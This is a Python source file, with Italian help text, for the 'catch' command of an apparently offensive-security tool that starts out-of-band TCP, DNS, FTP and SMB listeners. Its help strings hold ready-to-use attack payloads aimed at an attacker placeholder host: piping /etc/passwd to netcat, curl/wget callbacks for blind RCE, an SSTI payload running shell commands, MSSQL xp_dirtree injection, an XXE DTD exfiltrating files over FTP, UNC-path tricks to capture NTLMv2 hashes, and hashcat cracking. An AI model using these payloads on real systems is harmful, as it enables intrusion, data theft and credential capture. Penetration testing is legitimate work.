from __future__ import annotations

import argparse

from http_server import (
    catch_start,
    catch_stop,
    catch_status,
    catch_logs,
    catch_clear_logs,
    catch_dns_token,
    _CATCH_TYPES,
)

from sealion import normalize, render_markdown, _paged_print


def _catch_help_main() -> None:
    render_markdown(r"""# catch — OOB Listeners

Server in background per confermare vulnerabilità blind e catturare dati.
Ogni listener gira in parallelo al server HTTP principale.

## Tipi di listener

| Tipo | Porta default | Uso |
|------|:---:|---|
| **tcp** | 4444 | Conferma callback (RCE, SSRF, SSTI) |
| **dns** | 53 | Blind SSRF, XXE, SQLi via DNS (funziona anche con firewall restrittivi) |
| **ftp** | 2121 | Esfiltrazione dati da blind XXE |
| **smb** | 445 | Cattura hash NTLMv2 (UNC path injection) |

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `catch <tipo> on [--port N]` | Avvia listener |
| `catch <tipo> off` | Ferma listener specifico |
| `catch off` | Ferma tutti i listener |
| `catch status` | Mostra listener attivi |
| `catch logs [tipo]` | Mostra log (tutti o per tipo) |
| `catch clear [tipo]` | Svuota log |
| `catch dns token` | Genera token per payload DNS |
| `catch help` | Mostra questo aiuto |

## Esempi

```bash
# Conferma RCE blind
catch tcp on
# nel target: curl http://TUO_IP:4444/rce

# Conferma SSRF via DNS
catch dns on --port 5353
catch dns token
# nel target: nslookup TOKEN.TUO_IP TUO_IP

# Esfiltra dati da blind XXE
catch ftp on
# XXE payload: ftp://TUO_IP:2121/dati

# Cattura hash NTLMv2
catch smb on
# nel target: \\TUO_IP\SHARE\test
```
""")


def _catch_help_tcp() -> None:
    render_markdown(r"""# catch tcp — TCP Raw Listener

Listener TCP generico che logga ogni connessione e i dati ricevuti.
Il più semplice e versatile per confermare che un target ti raggiunge.

## Uso

```bash
catch tcp on [--port 4444]
```

## Scenari

**Conferma RCE blind:**
```bash
# payload nel parametro vulnerabile:
; curl http://TUO_IP:4444/rce_confirmed
; wget http://TUO_IP:4444/rce -O /dev/null
; ping -c1 TUO_IP  # (usa catch dns per ping)
```

**Conferma SSRF:**
```
url=http://TUO_IP:4444/ssrf_test
```

**Esfiltrazione veloce:**
```bash
cat /etc/passwd | nc TUO_IP 4444
```
""")


def _catch_help_dns() -> None:
    render_markdown(r"""# catch dns — DNS Logger

Server DNS che logga tutte le query ricevute. Perfetto per blind detection
quando HTTP è bloccato in uscita — il DNS passa quasi sempre.

## Uso

```bash
catch dns on [--port 53]
catch dns token     # genera token unico per i payload
```

## Scenari

**Blind command injection:**
```bash
$(whoami).TOKEN.TUO_IP
```
→ nel log DNS vedi: `www-data.a8f3c2.TUO_IP`

**Blind SQL injection (MSSQL):**
```sql
'; EXEC master..xp_dirtree '\\TOKEN.TUO_IP\x'--
```

**Blind SSRF:**
```
url=http://TOKEN.TUO_IP/
```

**Blind SSTI:**
```
{{config.__class__.__init__.__globals__['os'].popen('nslookup TOKEN.TUO_IP').read()}}
```

## Note

- Porta 53 richiede privilegi root (o `sudo`)
- Usa `--port 5353` per evitare sudo (ma serve `dig @IP -p 5353` nel payload)
- I token generati con `catch dns token` vengono evidenziati nei log con ★
""")


def _catch_help_ftp() -> None:
    render_markdown(r"""# catch ftp — FTP Logger

Server FTP minimale per catturare dati esfiltrati, tipicamente da blind XXE.

## Uso

```bash
catch ftp on [--port 2121]
```

## Scenario tipico: Blind XXE

1. Confermi XXE blind su un endpoint che parsa XML
2. Crei un DTD malevolo come file statico (via SLWeb o `static/`):

```xml
<!-- evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'ftp://TUO_IP:2121/%data;'>">
%send;
```

3. Invii l'XML:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://TUO_IP:2727/static/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

4. Il parser XML legge `/etc/passwd` e lo invia al tuo FTP. Lo vedi nei log.

## Note

- Accetta qualsiasi credenziale (logga USER e PASS)
- I dati ricevuti via STOR vengono loggati integralmente (max 64KB)
""")


def _catch_help_smb() -> None:
    render_markdown(r"""# catch smb — SMB Hash Capture

Server SMB minimale che cattura hash NTLMv2 quando un target Windows tenta
l'autenticazione automatica via UNC path. Nessuna dipendenza esterna.

## Uso

```bash
catch smb on [--port 445]
```

## Scenari

**UNC path injection (SSRF, LFI, upload):**
```
\\TUO_IP\x\test
```

**Forced authentication (HTML injection, email):**
```html
<img src="\\TUO_IP\x\image.png">
```

**SQL injection (MSSQL):**
```sql
EXEC master..xp_dirtree '\\TUO_IP\x'
```

## Dopo la cattura

Gli hash NTLMv2 appaiono nei log e vengono salvati in `loot/ntlmv2_hashes.txt`.
Crackali con hashcat:

```bash
hashcat -m 5600 loot/ntlmv2_hashes.txt wordlist.txt
```

## Note

- Porta 445 richiede privilegi root
- Formato hash: `user::domain:challenge:ntproof:blob` (compatibile hashcat -m 5600)
- Risponde solo a SMB1 Negotiate + NTLMSSP Auth (cattura, non serve file)
""")


_CATCH_HELP_TOPICS: dict[str, callable] = {
    "tcp": _catch_help_tcp,
    "dns": _catch_help_dns,
    "ftp": _catch_help_ftp,
    "smb": _catch_help_smb,
}


def cmd_catch(args: argparse.Namespace, state=None) -> int:
    action = normalize(getattr(args, "action", None) or "status")
    extra = getattr(args, "extra", None)
    port = getattr(args, "port", None)

    if action in {"help", "h", "-h", "--help"}:
        if extra:
            handler = _CATCH_HELP_TOPICS.get(normalize(extra))
            if handler:
                handler()
            else:
                print(f"Tipo sconosciuto: {extra}")
                print(f"Tipi disponibili: {', '.join(_CATCH_TYPES)}")
        else:
            _catch_help_main()
        return 0

    if action == "status":
        print(catch_status())
        return 0

    if action in {"off", "stop"}:
        target = normalize(extra) if extra else "all"
        print(catch_stop(target))
        return 0

    if action in {"logs", "log"}:
        stype = normalize(extra) if extra else None
        entries = catch_logs(stype)
        if not entries:
            print("Nessun evento registrato.")
            return 0
        lines = []
        for e in entries:
            tag = e.get("type", "?").upper()
            lines.append(f"  \033[90m{e['ts']}\033[0m  "
                         f"\033[96m{tag:<5s}\033[0m  "
                         f"\033[93m{e['client']:<16s}\033[0m  "
                         f"{e['msg']}")
        print(f"\n  \033[1m{len(entries)} eventi:\033[0m\n")
        _paged_print(lines)
        return 0

    if action in {"clear", "clean", "purge"}:
        target = normalize(extra) if extra else "all"
        print(catch_clear_logs(target))
        return 0

    if action == "dns" and extra and normalize(extra) == "token":
        print(catch_dns_token())
        return 0

    if action in _CATCH_TYPES:
        sub = normalize(extra) if extra else "on"
        if sub in {"on", "start"}:
            print(catch_start(action, port))
            return 0
        if sub in {"off", "stop"}:
            print(catch_stop(action))
            return 0
        if sub == "token" and action == "dns":
            print(catch_dns_token())
            return 0
        print(f"Sotto-comando sconosciuto per {action}: {extra}")
        print(f"  Usa: catch {action} on/off")
        return 1

    if action in {"on", "start"}:
        if extra and normalize(extra) in _CATCH_TYPES:
            print(catch_start(normalize(extra), port))
            return 0
        print("Specifica il tipo di listener: catch <tcp|dns|ftp|smb> on")
        return 1

    print(f"Comando sconosciuto: catch {action}")
    print("Usa 'catch help' per i comandi disponibili.")
    return 1
